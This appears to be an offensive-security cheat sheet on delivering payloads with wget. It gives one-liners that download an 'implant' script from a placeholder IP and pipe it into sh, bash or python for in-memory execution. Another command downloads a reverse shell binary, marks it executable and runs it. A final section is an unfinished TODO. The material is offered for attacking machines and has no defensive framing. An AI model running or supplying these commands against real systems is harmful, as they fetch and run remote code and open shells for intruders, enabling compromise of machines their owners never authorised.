# Wget

## 01 - Fileless code execution

This is useful if the machine doesn't have `curl` pre-installed so you can use `wget` to execute it in memory.

```
$ wget -qO- http[s]://<IP>/implant.sh | sh

$ wget -qO- http[s]://<IP>/implant.sh | bash

$ wget -qO- http[s]://<IP>/implant.py | python
```

## 02 - Dropping on disk

Download reverse shell binary and execute it.

```
$ wget -O shell.elf http[s]://<IP>/shell.elf && chmod +x shell.elf && ./shell.elf
```

## 03 - Compiled After Delivery

TODO: Fill this info

```
$ gcc
```